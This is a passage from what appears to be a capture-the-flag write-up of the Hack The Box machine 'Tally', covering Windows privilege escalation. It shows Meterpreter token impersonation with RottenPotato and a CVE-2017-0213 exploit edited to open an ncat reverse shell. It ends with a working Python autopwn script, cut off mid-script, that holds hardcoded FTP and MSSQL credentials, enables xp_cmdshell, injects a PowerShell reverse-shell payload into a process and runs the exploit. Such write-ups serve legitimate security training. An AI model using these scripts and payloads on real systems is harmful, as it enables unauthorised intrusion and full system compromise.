<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">meterpreter &gt; sysinfo
</span></span></span><span class="line"><span class="cl"><span class="go">Computer        : TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">OS              : Windows 2016 (Build 14393).
</span></span></span><span class="line"><span class="cl"><span class="go">Architecture    : x64
</span></span></span><span class="line"><span class="cl"><span class="go">System Language : en_GB
</span></span></span><span class="line"><span class="cl"><span class="go">Domain          : HTB.LOCAL
</span></span></span><span class="line"><span class="cl"><span class="go">Logged On Users : 7
</span></span></span><span class="line"><span class="cl"><span class="go">Meterpreter     : x64/windows
</span></span></span></code></pre></div></div></p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<h2 id="using-incognito-and-rottenpotato">Using Incognito and RottenPotato</h2>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">meterpreter &gt; getprivs
</span></span></span><span class="line"><span class="cl"><span class="go">============================================================
</span></span></span><span class="line"><span class="cl"><span class="go">Enabled Process Privileges
</span></span></span><span class="line"><span class="cl"><span class="go">============================================================
</span></span></span><span class="line"><span class="cl"><span class="go">  SeAssignPrimaryTokenPrivilege
</span></span></span><span class="line"><span class="cl"><span class="go">  SeChangeNotifyPrivilege
</span></span></span><span class="line"><span class="cl"><span class="go">  SeCreateGlobalPrivilege
</span></span></span><span class="line"><span class="cl"><span class="go">  SeImpersonatePrivilege
</span></span></span><span class="line"><span class="cl"><span class="go">  SeIncreaseQuotaPrivilege
</span></span></span><span class="line"><span class="cl"><span class="go">  SeIncreaseWorkingSetPrivilege
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; cd C:\\Users\\Sarah\\Desktop
</span></span></span><span class="line"><span class="cl"><span class="go">meterpreter &gt; upload rottenpotato.exe
</span></span></span><span class="line"><span class="cl"><span class="go">[*] uploading  : rottenpotato.exe -&gt; rottenpotato.exe
</span></span></span><span class="line"><span class="cl"><span class="go">[*] uploaded   : rottenpotato.exe -&gt; rottenpotato.exe
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; load incognito
</span></span></span><span class="line"><span class="cl"><span class="go">Loading extension incognito...success.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; list_tokens -u
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span></span></span><span class="line"><span class="cl"><span class="go">             Call rev2self if primary process token is SYSTEM
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Delegation Tokens Available
</span></span></span><span class="line"><span class="cl"><span class="go">========================================
</span></span></span><span class="line"><span class="cl"><span class="go">TALLY\Sarah
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impersonation Tokens Available
</span></span></span><span class="line"><span class="cl"><span class="go">========================================
</span></span></span><span class="line"><span class="cl"><span class="go">NT SERVICE\SQLSERVERAGENT
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; execute -Hc -f C:\\Users\\Sarah\\Desktoprottenpotato.exe
</span></span></span><span class="line"><span class="cl"><span class="go">Process 7996 created.
</span></span></span><span class="line"><span class="cl"><span class="go">Channel 2 created.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; list_tokens -u
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span></span></span><span class="line"><span class="cl"><span class="go">             Call rev2self if primary process token is SYSTEM
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Delegation Tokens Available
</span></span></span><span class="line"><span class="cl"><span class="go">========================================
</span></span></span><span class="line"><span class="cl"><span class="go">TALLY\Sarah
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impersonation Tokens Available
</span></span></span><span class="line"><span class="cl"><span class="go">========================================
</span></span></span><span class="line"><span class="cl"><span class="go">NT AUTHORITY\SYSTEM
</span></span></span><span class="line"><span class="cl"><span class="go">NT SERVICE\SQLSERVERAGENT
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span></span></span><span class="line"><span class="cl"><span class="go">             Call rev2self if primary process token is SYSTEM
</span></span></span><span class="line"><span class="cl"><span class="go">[-] No delegation token available
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Successfully impersonated user NT AUTHORITY\SYSTEM
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; shell
</span></span></span><span class="line"><span class="cl"><span class="go">Process 3452 created.
</span></span></span><span class="line"><span class="cl"><span class="go">Channel 3 created.
</span></span></span><span class="line"><span class="cl"><span class="go">Microsoft Windows [Version 10.0.14393]
</span></span></span><span class="line"><span class="cl"><span class="go">(c) 2016 Microsoft Corporation. All rights reserved.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\Users\Sarah\Desktop&gt; whoami
</span></span></span><span class="line"><span class="cl"><span class="go">nt authority\system :D
</span></span></span></code></pre></div></div>

<h2 id="using-cve-2017-213">Using CVE-2017-213</h2>

<p>We can also use CVE-2017-213 for privilege escalation:</p>

<ol>
<li><p><a href="https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Source/CVE-2017-0213.cpp" target="_blank">https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Source/CVE-2017-0213.cpp</a></p></li>

<li><p>Change the cmdline in CVE-2017-0213.cpp to run ncat or a powershell script to get a remote shell. E.g.:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">Sarah</span><span class="se">\\</span><span class="s">Desktop</span><span class="se">\\</span><span class="s">ncat.exe 10.10.14.190 60002 -e cmd.exe&#34;</span></span></span></code></pre></div>
or
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;powershell -ExecutionPolicy bypass -NoExit -File C:</span><span class="se">\\</span><span class="s">FTP</span><span class="se">\\</span><span class="s">Intranet</span><span class="se">\\</span><span class="s">shell.ps1&#34;</span><span class="p">;</span></span></span></code></pre></div></p></li>

<li><p>Compile it, upload it and copy it in a folder where user has write permissions.</p></li>

<li><p>Migrate your existing shell to another process (Important! Otherwise it doesn&rsquo;t work.)</p></li>

<li><p>Set up the listener on your side.</p></li>

<li><p>Execute CVE-2017-213.exe</p></li>
</ol>

<p>You can download my autopwn script (and the other required files) from here:
<a href="https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Tally" target="_blank">https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Tally</a></p>

<p>(Don&rsquo;t forget to set LHOST appropriately. If you are using a Linux OS, the script tries to automatically get the LHOST IP from the tun0 interface).
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">fcntl</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">_mssql</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">signal</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ftplib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x8915</span><span class="p">,</span>  <span class="c1"># SIOCGIFADDR</span>
</span></span><span class="line"><span class="cl">        <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="p">)[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#LHOST = &#34;10.10.15.247&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="s1">&#39;tun0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">LPORT1</span><span class="o">=</span><span class="s2">&#34;60000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">LPORT2</span><span class="o">=</span><span class="s2">&#34;60001&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">LPORT3</span><span class="o">=</span><span class="s2">&#34;60002&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">FTP_SERVER</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.59&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">FTP_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;ftp_user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">FTP_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;UTDRSCH53c</span><span class="se">\&#34;</span><span class="s2">$6hys&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">FTP_UPLOADPATH</span> <span class="o">=</span> <span class="s2">&#34;Intranet&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">MSSQL_SERVER</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.59:1433&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">MSSQL_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;sa&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">MSSQL_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;GWE3V65#6KFH93@4GWTG2G&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">60</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_ps_payload</span><span class="p">(</span><span class="n">lost</span><span class="p">,</span> <span class="n">lport</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;</span><span class="o">+</span><span class="n">lost</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="n">lport</span><span class="o">+</span><span class="s2">&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%</span><span class="si">{0}</span><span class="s2">; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">initiate</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">unique_filename1</span> <span class="o">=</span> <span class="s2">&#34;msf1.ps1&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">unique_filename2</span> <span class="o">=</span> <span class="s2">&#34;msf2.ps1&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename1</span><span class="p">,</span><span class="s1">&#39;wt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename2</span><span class="p">,</span><span class="s1">&#39;wt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="n">ftp</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftp</span> <span class="o">=</span> <span class="n">ftplib</span><span class="o">.</span><span class="n">FTP</span><span class="p">(</span><span class="n">FTP_SERVER</span><span class="p">,</span><span class="n">FTP_USERNAME</span><span class="p">,</span><span class="n">FTP_PASSWORD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Successful login at ftp server &#34;</span><span class="o">+</span><span class="n">FTP_SERVER</span><span class="o">+</span><span class="s2">&#34; with username &#39;&#34;</span><span class="o">+</span><span class="n">FTP_USERNAME</span><span class="o">+</span><span class="s2">&#34;&#39; and password &#39;&#34;</span><span class="o">+</span><span class="n">FTP_PASSWORD</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Changing current working directory to &#34;</span> <span class="o">+</span> <span class="n">FTP_UPLOADPATH</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftp</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename1</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s1">&#39;STOR &#39;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject.ps1&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&#34;STOR Invoke-PSInject.ps1&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">unique_filename2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename2</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s1">&#39;STOR &#39;</span><span class="o">+</span><span class="n">unique_filename2</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading cve2017213ps.exe&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;cve2017213ps.exe&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&#34;STOR cve2017213ps.exe&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;FTP failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ftp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">mssql</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mssql</span> <span class="o">=</span> <span class="n">_mssql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">MSSQL_SERVER</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">MSSQL_USERNAME</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">MSSQL_PASSWORD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Successful login at mssql server &#34;</span><span class="o">+</span><span class="n">MSSQL_SERVER</span><span class="o">+</span><span class="s2">&#34; with username &#39;&#34;</span><span class="o">+</span><span class="n">MSSQL_USERNAME</span><span class="o">+</span><span class="s2">&#34;&#39; and password &#39;&#34;</span><span class="o">+</span><span class="n">MSSQL_PASSWORD</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Enabling &#39;xp_cmdshell&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;, 1;RECONFIGURE -- &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC master..xp_cmdshell &#39;powershell -ExecutionPolicy bypass -NoExit -File C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;MSSQL failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mssql</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">mssql</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LHOST = &#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">initiate</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">ps1</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ps1</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject -ProcName sihost -PoshCode &#34;</span><span class="o">+</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload2</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ps2</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ps2</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;copy C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">cve2017213ps.exe C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ps3</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT3</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
